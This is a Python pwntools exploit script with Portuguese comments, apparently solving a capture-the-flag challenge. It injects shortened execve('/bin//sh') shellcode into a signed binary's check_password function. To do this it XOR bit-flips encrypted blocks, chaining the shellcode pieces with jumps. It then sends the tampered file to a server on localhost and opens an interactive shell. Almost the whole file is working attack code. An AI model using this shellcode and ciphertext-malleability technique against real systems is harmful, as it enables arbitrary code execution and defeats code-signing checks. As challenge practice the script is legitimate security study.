from pwn import *
import os

context.arch = 'amd64'

# Got from https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
shellcode =  b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

# Legal que os primeiros 14 bytes formam uma seq de instrucoes validas
# Ou seja, se pegamos shellcode[:14] a gnt nao divide nenhuma instrucao no meio
# Adicionamos um jump para o proximo bloco

jmp = b'\xEB' + bytes([16])

blk0 = b'\x90' * 14 + jmp

blk1 = shellcode[:14] + jmp
blk2 = shellcode[14:]
blk2 += b'\x00' * (16 - len(blk2))

print('Será executado algo do tipo (os nops são instruções inválidas): ')
print(disasm(blk1 + b'\x90' * 16 + blk2))


#cwd = os.path.abspath('../server')
#conn: tube = process(['python', 'server.py'], cwd=cwd)
conn: tube = remote('localhost', 5000)

sample = open('../../public/sample', 'rb').read()
signed_sample = bytearray(open('../../public/signed_sample', 'rb').read())


# Vamos por a payload na funcao check_password
# A funcao comeca em 0x139b, entao o bloco 0 começa em 0x1390 e vai ate 0x13a0
diff0 = xor(blk0, sample[0x1390:0x13a0])

# Agora, o primeiro bloco vai de 0x13b0 até 0x13c0, e o segundo de 0x13d0 até 0x13e0
diff1 = xor(blk1, sample[0x13b0:0x13c0])
diff2 = xor(blk2, sample[0x13d0:0x13e0])

# Os blocos que tem que ser feito o xor seriam 16 bytes atrás dos selecionados, entretanto,
# como o signed_sample contem o IV, acaba que os blocos a serem xorados tem o mesmo endereço!

signed_sample[0x1390:0x13a0] = xor(signed_sample[0x1390:0x13a0], diff0)
signed_sample[0x13b0:0x13c0] = xor(signed_sample[0x13b0:0x13c0], diff1)
signed_sample[0x13d0:0x13e0] = xor(signed_sample[0x13d0:0x13e0], diff2)

conn.sendline(signed_sample.hex().encode())

conn.interactive()

